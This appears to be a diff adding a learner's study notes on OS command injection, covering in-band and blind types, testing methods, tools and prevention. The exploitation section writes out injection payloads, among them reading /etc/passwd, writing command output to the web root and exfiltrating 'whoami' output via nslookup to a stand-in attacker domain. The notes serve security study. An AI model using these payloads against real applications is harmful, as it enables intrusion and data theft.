@@ -1,1 +1,86 @@
+Hi today we are starting the Command Injection !! , so exicted to start this attack vlunerability.
+
+Agenda :
+What is command injection?
+how do we find it?
+how do we exploit it?
+how do we prevent it?
+
+
+Alice  -->>  Web Application  -->>  Web Server 
+
+Types of command injection
+1 ) In-band Command Injection: 
+consist of an attacker ececuting commands on the ost operating system via a vlunerable applicaiton and receiving the response of the command in the application
+
+2) Blind Command Injection
+consist of an attacker executing commands on the host operating system via a vluneralbe application that does not return the output from the the command within its HTTP response.
+
+Impact of Command Injection Attacks
+Confidentiality -> command injection can be used to view sensitive information
+Integrity -> Command injection can be used to alter content in the applicaiton.
+Availabiilty -> command injection can be used to delete content in the application.
+
+
+Method of Testing :
+Black-Box Testing
+-------------------
+* Map the application. -> Identify all instances where the web applicatoin apperars to be interacting with the underlying operating system.
+* Fuzz the application. -> shell meacharacters : & ,&&, |,||,;<\n,`,$().
+* for in-band command injection , analyze the response of the application to detemine if it's vulnerable.
+* For blnd command injection, we need to get creative, 
+   -> trigger a time delay using the ping or sleep command.
+   -> output the response of the command in the web root and retrieve the file directly using a browser
+   -> open an out-of-band channel back to a server you control.
+
+Whit-Box testing
+------------------
+* map all input vectors in the application
+* Review source code to determine if any of the input vectors are added as parameters to functions that execute system commands.
+* Once a vlunerability is identified , test it to confirm that it is exploitable.
+
+
+
+------------------------------ How to exploit command injection ---------------------------------
+In-band command injection -> resuts are revert back to web appliction
+ -> shell metacharacters : &,&&,\,||,;,\n,`,$()
+ -> concatenate another command 
+    127.0.0.1 && cat /etc/passwd & 
+    127.0.0.1 || cat etc/passwd &
+
+Blind command injection
+ -> shell metacharacters : &,&&,\,||,;,\n,`,$()
+ -> Trigger a time delay
+     127.0.0.1 && sleep 10 & => works only for linux
+     127.0.0.1 && ping -c 10 127.3.3.1 & => works on both linux and windows
+Only this won't impact , output the response of the command in the web root and tetrieve the file directily using a browser.
+      127.0.0.1 & whoami > //var/www/static/whoami.txt &
+-> open an out-of-band channel back to server we control
+      127.0.0.1 & nslookup yogi.web-attacker.com & => no impact
+      127.0.0.1 & nslookup `whoami`.yogi.web-attacker.com &
+
+Automated exploitation Tools
+burpsuite 
+w3af
+wapiti
+arachni
+
+
+
+--------------------------------- how to prevent command injection -----------------------------
+* The most effective way to prevent OS command inection vlunerabilites is to never call out to OS commands from application-layer code. instead, implement the required functionlity using safer platfrom APIs
+* validate against a whitelist of permitted values.
+* validate that the input is a expected or valid input.
+
+
+
+
+
+
+
+
+
+
+
+
 
